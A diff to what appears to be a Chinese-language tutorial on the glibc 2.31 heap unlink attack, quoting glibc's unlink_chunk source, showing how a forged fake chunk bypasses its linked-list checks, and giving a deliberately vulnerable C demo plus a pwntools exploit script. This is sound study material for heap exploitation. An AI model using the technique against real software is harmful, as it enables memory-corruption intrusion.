@@ -383,4 +383,111 @@ static void malloc_consolidate(mstate av)
 
 ### 源代码
 
-  这里给出glibc2.31版本的unlink，之前是以宏的形式存在的，并且比之前多了一些检查，但是没有太大的影响
+  这里给出glibc2.31版本的**unlink**，之前是以宏的形式存在的，并且比之前多了一些检查，但是没有太大的影响
+  ```c
+/* Take a chunk off a bin list.  */
+static void
+unlink_chunk (mstate av, mchunkptr p)
+{
+  if (chunksize (p) != prev_size (next_chunk (p)))
+    malloc_printerr ("corrupted size vs. prev_size");
+
+  mchunkptr fd = p->fd;
+  mchunkptr bk = p->bk;
+
+  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
+    malloc_printerr ("corrupted double-linked list");
+
+  fd->bk = bk;
+  bk->fd = fd;
+  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
+    {
+      if (p->fd_nextsize->bk_nextsize != p
+	  || p->bk_nextsize->fd_nextsize != p)
+	malloc_printerr ("corrupted double-linked list (not small)");
+
+      if (fd->fd_nextsize == NULL)
+	{
+	  if (p->fd_nextsize == p)
+	    fd->fd_nextsize = fd->bk_nextsize = fd;
+	  else
+	    {
+	      fd->fd_nextsize = p->fd_nextsize;
+	      fd->bk_nextsize = p->bk_nextsize;
+	      p->fd_nextsize->bk_nextsize = fd;
+	      p->bk_nextsize->fd_nextsize = fd;
+	    }
+	}
+      else
+	{
+	  p->fd_nextsize->bk_nextsize = p->bk_nextsize;
+	  p->bk_nextsize->fd_nextsize = p->fd_nextsize;
+	}
+    }
+}
+```
+
+  一般在题目中，我们操作的chunk大小都是位于**small bin**范围内。因此，理论上，如果我们可以控制`p`的fd和bk字段，将上述代码进行一定的简化，如下所示
+  ```c
+mchunkptr fd = p->fd;
+mchunkptr bk = p->bk;
+fd->bk = bk;
+bk->fd = fd;
+```
+
+  其会将`fd + SIZE_SZ * 3`地址处的值设置为**bk**;会将`bk + SIZE_SZ * 2`地址处的值设置为**fd**。
+  但需要注意的是，**unlink**还会有安全检查:一方面，其会检查传入的**p**是否为合法的chunk;另一方面，其会检查**fd**和**bk**字段是否为有效的，因为如果调用**unlink**，则表明**p**应该是位于双向链表中，则必定有**p->fd->bk == p && p->bk->fd == p**(即双向链表中前驱的后继节点和后继的前驱节点都仍然是该节点)。因此，**fd**字段和**bk**字段实际上不能任取。
+  为了绕过这些检查，我们需要一个稍微苛刻一点的条件——我们需要一个指向正常内存(**chunk**)的指针**ptr**;**ptr**所指向的内存**chunk**已经被释放，其**fd**字段的值设置为**&ptr - SIZE_SZ * 3**，即`*(chunk + SIZE_SZ * 2) = &ptr - SIZE_SZ * 3`,其**bk**字段的值设置为**&ptr - SIZE_SZ * 2**，即`*(chunk + SIZE_SZ * 3) = &ptr - SIZE_SZ * 2`。其内存对象如下所示
+  ![unlink攻击下chunk内存对象](unlink攻击下chunk内存对象.PNG)
+
+  此时，当释放**nextchunk**时，**unlink**以为的chunk的双向链表如下所示
+  ![unlink攻击下伪造的双向链表](unlink攻击下伪造的双向链表.PNG)
+
+  根据chunk内存对象的示意图，可以清楚的看到，其满足检测条件1，即`chunksize (chunk) == prev_size (nextchunk)`;对于检测条件2，根据伪造的双向链表的示意图，也很容易验证其正确性，即`p->fd->bk`即为`(*(chunk + SIZE_SZ * 2))->bk == (ptr - SIZE_SZ * 3)->bk == *(ptr - SIZE_SZ * 3 + SIZE_SZ * 3) == *(ptr) == chunk`;同理，`p->bk->fd`即为`(*(chunk + SIZE_SZ * 3))->fd == (ptr - SIZE_SZ * 2)->fd == *(ptr - SIZE_SZ * 2 + SIZE_SZ * 2) == *(ptr) == chunk`。
+  在上述的攻击方式下，有`&(p->fd->bk) == &(p->bk->fd) == ptr`，则执行后的结果为`*ptr = ptr - 0x18`
+
+### 利用姿势
+
+  可能这里对于**unlink攻击**还是比较困惑，这里给出一个常见的**unlink攻击**的利用姿势
+
+  如下所示
+  ```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void) {
+	setbuf(stdout, NULL);
+
+	long long *ptr1 = (long long*)malloc(0x38);
+	long long *ptr2 = (long long*)malloc(0x80);
+
+	printf("%p=>%p\n", &ptr1, ptr1);
+
+	ptr2[-1] = 0x90;
+	read(0, ptr1, 0x38);
+	free(ptr2);
+
+	printf("%p=>%p\n", &ptr1, ptr1);
+	return 0;
+}
+```
+
+利用
+```python
+from pwn import *
+
+context.log_level = 'debug'
+#sh = process('./unlink-poc')
+sh = gdb.debug('./unlink-poc')
+
+ptr1_addr = int(sh.recvuntil('=>')[2:-2], 16)
+ptr1_val = int(sh.recvuntil('\n')[2:-1], 16)
+log.info('ptr1_addr => %#x, ptr1_val => %#x'%(ptr1_addr, ptr1_val))
+
+sh.send(p64(0) + p64(0x31) + p64(ptr1_addr - 0x18) + p64(ptr1_addr - 0x10) + p64(0) * 2 + p64(0x30))
+
+ptr1_addr = int(sh.recvuntil('=>')[2:-2], 16)
+ptr1_val = int(sh.recvuntil('\n')[2:-1], 16)
+log.info('ptr1_addr => %#x, ptr1_val => %#x'%(ptr1_addr, ptr1_val))
+```
